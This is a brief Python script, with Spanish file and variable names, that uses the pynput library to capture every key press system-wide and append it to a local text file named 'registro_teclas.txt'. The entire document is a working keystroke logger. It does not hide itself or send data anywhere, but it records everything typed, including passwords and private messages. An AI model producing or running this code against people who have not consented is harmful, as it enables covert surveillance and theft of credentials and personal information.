from pynput import keyboard

def on_press(key):
    try:
        with open("registro_teclas.txt", "a") as archivo:
            archivo.write(f'{key.char}\n')
    except AttributeError:
        with open("registro_teclas.txt", "a") as archivo:
            archivo.write(f'{key}\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
